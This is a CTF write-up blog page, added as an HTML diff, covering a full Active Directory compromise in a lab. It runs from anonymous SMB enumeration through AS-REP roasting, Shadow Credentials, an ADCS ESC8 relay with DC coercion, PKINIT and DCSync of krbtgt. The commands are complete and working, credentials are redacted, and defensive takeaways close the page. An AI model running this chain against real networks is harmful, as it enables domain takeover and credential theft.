@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ShadowGate — null session to krbtgt via ADCS ESC8 | Shashank Patil</title>
+<meta name="description" content="Black-box Active Directory on Hack Smarter: anonymous SMB user enumeration, an AS-REP roast, a Shadow Credentials attack off a loose GenericWrite, then an ADCS ESC8 relay to mint a domain-controller certificate and DCSync the krbtgt.">
+
+<style>
+
+body{
+background:black;
+color:#00ff9c;
+font-family:monospace;
+margin:0;
+padding:0;
+}
+
+nav{
+padding:15px;
+border-bottom:1px solid #00ff9c;
+}
+
+nav a{
+color:#00ff9c;
+margin-right:20px;
+text-decoration:none;
+}
+
+nav a:hover{
+text-decoration:underline;
+}
+
+main{
+max-width:800px;
+margin:0 auto;
+padding:40px 20px 80px 20px;
+line-height:1.75;
+font-size:15px;
+}
+
+h1{
+line-height:1.3;
+}
+
+h2{
+margin-top:55px;
+border-bottom:1px solid #00ff9c;
+padding-bottom:8px;
+}
+
+h3{
+margin-top:35px;
+}
+
+a{
+color:#00ff9c;
+}
+
+.meta{
+opacity:0.65;
+font-size:13px;
+margin-bottom:40px;
+}
+
+code{
+background:#062;
+color:#c9ffe8;
+padding:1px 5px;
+}
+
+pre{
+border:1px solid #00ff9c;
+padding:15px;
+overflow-x:auto;
+font-size:13px;
+line-height:1.5;
+}
+
+pre code{
+background:none;
+color:#00ff9c;
+padding:0;
+}
+
+blockquote{
+border-left:3px solid #00ff9c;
+margin:30px 0;
+padding:5px 0 5px 20px;
+opacity:0.9;
+}
+
+ul{
+padding-left:20px;
+}
+
+li{
+margin-bottom:8px;
+}
+
+footer{
+border-top:1px solid #00ff9c;
+margin-top:60px;
+padding-top:20px;
+font-size:13px;
+opacity:0.8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<nav>
+<a href="../index.html">Home</a>
+<a href="../blog.html">Blog</a>
+<a href="https://github.com/b17w1z4rd">GitHub</a>
+</nav>
+
+<main>
+
+<h1>$ cat shadowgate.md</h1>
+
+<p class="meta">
+Hack Smarter &middot; Easy &middot; Active Directory
+</p>
+
+<p>
+Black-box internal AD &mdash; one IP, no credentials, VPN only. The chain runs entirely through misconfiguration, not exploits: anonymous SMB leaks the user list -&gt; one account has Kerberos pre-auth disabled, so <strong>AS-REP roast</strong> it and crack offline -&gt; that user holds <code>GenericWrite</code> over a second user who sits in <code>ADCS-Reader</code> -&gt; abuse the write with a <strong>Shadow Credentials</strong> attack to steal the second user's hash -&gt; as that user, enumerate AD CS and find <strong>ESC8</strong> (web enrollment over HTTP) -&gt; relay a coerced DC machine authentication to the enrollment endpoint and mint a certificate <em>as the domain controller</em> -&gt; PKINIT to the DC's hash -&gt; <strong>DCSync</strong> the krbtgt. Unauthenticated to domain admin in eight moves.
+</p>
+
+<p>
+<em>Run on Parrot with current tooling, so the commands differ from the older writeups in three ways worth flagging: impacket ships as <code>impacket-*</code> binaries, not <code>*.py</code>; <code>rustscan</code> isn't installed (plain nmap is fine); and Certipy v5 changed several flags. I've noted each where it bites. Credential values are redacted; the method is intact.</em>
+</p>
+
+<h2>$ recon</h2>
+
+<p>
+No rustscan on the box, so straight to nmap. The service list is a textbook domain controller &mdash; Kerberos, LDAP/GC, ADWS &mdash; with the tell that matters for later: <strong>SMB signing enabled but not required</strong>, which is what keeps the ESC8 relay alive at the end.
+</p>
+
+<pre><code>nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 $DC
+# 88/tcp   kerberos-sec
+# 389/636  ldap / ldaps    Domain: shadow.gate
+# 445      microsoft-ds    (signing: enabled, NOT required)
+# 5985     winrm
+# Host: DC01   DNS_Domain_Name: shadow.gate</code></pre>
+
+<h2>$ anonymous smb</h2>
+
+<p>
+A null session authenticates, and the DC hands its user list to an unauthenticated caller &mdash; the first misconfiguration, and the seed for everything downstream:
+</p>
+
+<pre><code>nxc smb $DC -u '' -p ''             # [+] shadow.gate\: (null session OK)
+nxc smb $DC -u '' -p '' --users
+# Administrator, krbtgt, ATHENA, mbrownlee, bbrown,
+# jtrueblood, jsmith, clocke, tclarke, jbradford, amoss</code></pre>
+
+<h2>$ AS-REP roasting</h2>
+
+<p>
+With a user list, spray for accounts that have Kerberos pre-authentication disabled &mdash; those hand back an AS-REP blob encrypted with the account's password hash, no credentials required. One account is vulnerable:
+</p>
+
+<pre><code>impacket-GetNPUsers -usersfile users.txt -request -format hashcat \
+  -outputfile asrep.txt -dc-ip $DC 'shadow.gate/'
+# [-] ...doesn't have UF_DONT_REQUIRE_PREAUTH set     (x10)
+# $krb5asrep$23$jtrueblood@SHADOW.GATE:...             &lt;- the one
+
+hashcat -a0 -m18200 asrep.txt rockyou.txt
+# jtrueblood : &lt;REDACTED&gt;</code></pre>
+
+<blockquote>
+On Parrot, impacket is installed as <code>impacket-GetNPUsers</code>, <code>impacket-secretsdump</code>, and so on &mdash; the <code>.py</code> names from most writeups won't resolve. Mode <code>18200</code> is AS-REP etype 23; <code>13100</code> would be Kerberoast (TGS-REP).
+</blockquote>
+
+<h2>$ the edge &mdash; GenericWrite + ADCS-Reader</h2>
+
+<p>
+Collect the graph as jtrueblood. The interesting outbound control: jtrueblood has <strong><code>GenericWrite</code> over bbrown</strong>, and bbrown is a member of <strong>ADCS-Reader</strong>. That second fact is why bbrown is worth becoming &mdash; the group name points straight at the certificate services, where the escalation lives. Confirmed from LDAP without touching the GUI:
+</p>
+
+<pre><code>nxc ldap $DC -u jtrueblood -p "$JT_PASS" \
+  --query "(sAMAccountName=bbrown)" "memberOf"
+# memberOf: CN=ADCS-Reader,CN=Users,DC=shadow,DC=gate</code></pre>
+
+<h2>$ becoming bbrown &mdash; Shadow Credentials</h2>
+
+<p>
+<code>GenericWrite</code> lets you write a target's <code>msDS-KeyCredentialLink</code> attribute. Drop a key pair in there, authenticate as them via PKINIT, pull their NT hash, and restore the attribute &mdash; a clean account takeover with nothing to crack and no lasting trace. Certipy automates the whole dance:
+</p>
+
+<pre><code>certipy shadow auto -u 'jtrueblood@shadow.gate' -p "$JT_PASS" \
+  -account bbrown -dc-ip $DC
+# [*] Adding Key Credential to msDS-KeyCredentialLink for bbrown
+# [*] Got TGT ... Restoring the old Key Credentials
+# [*] NT hash for 'bbrown': &lt;REDACTED&gt;</code></pre>
+
+<h2>$ ESC8 &mdash; the misconfiguration</h2>
+
+<p>
+As bbrown, enumerate AD CS. The finding is <strong>ESC8</strong>, and it's flagged on the <em>CA itself</em>, not on a template &mdash; this is the part people get wrong. ESC8 is a relay bug: the CA runs an HTTP web-enrollment endpoint that accepts NTLM, and request disposition is set to <code>Issue</code>. Nothing is wrong with any template; the vulnerability is that you can relay <em>someone else's</em> NTLM authentication to that endpoint and enroll a certificate on their behalf.
+</p>
+
+<pre><code>certipy find -u 'bbrown@shadow.gate' -hashes ":$BB_HASH" \
+  -dc-ip $DC -stdout -enabled
+# Certificate Authorities -&gt; shadow-DC01-CA
+#   Web Enrollment: HTTP Enabled : True
+#   Request Disposition : Issue
+#   [!] Vulnerabilities
+#       ESC8 : Web Enrollment is enabled over HTTP</code></pre>
+
+<blockquote>
+Certipy v5 <strong>removed the <code>-vulnerable</code> flag</strong> &mdash; <code>find</code> now assesses vulnerabilities by default and you narrow the output with <code>-enabled</code>. Older writeups all use <code>-vulnerable</code> and it will error on v5. Pass an NT hash as <code>-hashes ":&lt;nt&gt;"</code> (empty LM half).
+</blockquote>
+
+<h2>$ the relay &mdash; coercing DC01</h2>
+
+<p>
+ESC8 is a two-terminal move. Stand up a relay pointed at the enrollment endpoint, requesting a certificate on the <code>DomainController</code> template. Then coerce DC01 into authenticating <em>to you</em> &mdash; its machine-account auth gets relayed to the CA, and a certificate is issued for the DC.
+</p>
+
+<pre><code># terminal 1 - the relay (needs root to bind 445)
+sudo $(which certipy) relay -target 'http://DC01.shadow.gate' \
+  -template DomainController -ca shadow-DC01-CA
+
+# terminal 2 - coerce the DC back to our listener
+nxc smb $DC -u bbrown -H "$BB_HASH" -M coerce_plus -o LISTENER=$ATTACKER</code></pre>
+
+<p>
+The relay catches the coerced auth and writes the DC's identity to disk:
+</p>
+
+<pre><code># (terminal 1)
+# (SMB): Authenticating connection from DC01 ... SUCCEED
+# Certificate issued with request ID 3
+# Got certificate with DNS Host Name 'DC01.shadow.gate'
+# Saving certificate and private key to 'dc01.pfx'</code></pre>
+
+<blockquote>
+Two Parrot / v5 snags here. Certipy's relay binds a raw SMB listener on port 445, so it needs <code>sudo</code> &mdash; run it unprivileged and you get <code>Permission denied</code>. And <code>petitpotam.py</code> isn't installed; NetExec's <code>coerce_plus</code> module bundles PetitPotam / DFSCoerce / PrinterBug and fires the same MS-EFSRPC coercion. Make sure nothing (a stray <code>smbd</code>) is already squatting on 445, or the relay can't catch the auth.
+</blockquote>
+
+<h2>$ domain compromise &mdash; PKINIT + DCSync</h2>
+
+<p>
+Authenticate to Kerberos with the DC's certificate via PKINIT &mdash; that yields a TGT and the machine account's NT hash. A domain-controller account holds replication rights, so with its hash you can <strong>DCSync</strong>: ask the DC to replicate secrets as if you were another DC, and pull krbtgt.
+</p>
+
+<pre><code>certipy auth -pfx dc01.pfx -dc-ip $DC
+# Got hash for 'dc01$@shadow.gate': ...:&lt;REDACTED&gt;
+
+impacket-secretsdump 'shadow.gate/DC01$@DC01.shadow.gate' \
+  -hashes ":$DC_HASH" -just-dc-user krbtgt
+# krbtgt:502:...:&lt;REDACTED&gt;:::</code></pre>
+
+<h2>$ flag</h2>
+
+<pre><code>krbtgt NT hash : &lt;REDACTED&gt;</code></pre>
+
+<p>
+Owning krbtgt is the endgame: it's the key that signs every Kerberos ticket in the domain, so it lets you forge Golden Tickets for any principal, indefinitely. Full compromise.
+</p>
+
+<h2>$ takeaway</h2>
+
+<ul>
+<li><strong>There was no single bug &mdash; there was a chain of small defaults.</strong> Anonymous user enumeration, one account with pre-auth off, one loose ACL, one CA doing HTTP enrollment. Each is individually survivable; stacked, they're a straight line from unauthenticated to domain admin.</li>
+<li><strong>ESC8 is an endpoint problem, not a template problem.</strong> The fix isn't hardening a certificate template &mdash; it's disabling HTTP web enrollment, enforcing HTTPS with channel binding (EPA), and turning on SMB signing everywhere so coerced auth can't be relayed in the first place.</li>
+<li><strong>GenericWrite is account takeover.</strong> Shadow Credentials turns a single writable attribute into someone else's hash with no cracking and no password reset. Audit <code>msDS-KeyCredentialLink</code> write permissions the way you'd audit who can reset passwords.</li>
+<li><strong>Kerberos pre-auth should never be disabled.</strong> One <code>DONT_REQ_PREAUTH</code> account handed over the entire foothold, offline and unauthenticated.</li>
+</ul>
+
+<footer>
+<p>
+CTF handle <code>b17w1z4rd</code> &middot; <a href="https://github.com/b17w1z4rd">github.com/b17w1z4rd</a>
+</p>
+<p>
+<a href="../blog.html">&larr; back to all posts</a>
+</p>
+</footer>
+
+</main>
+
+</body>
+</html>
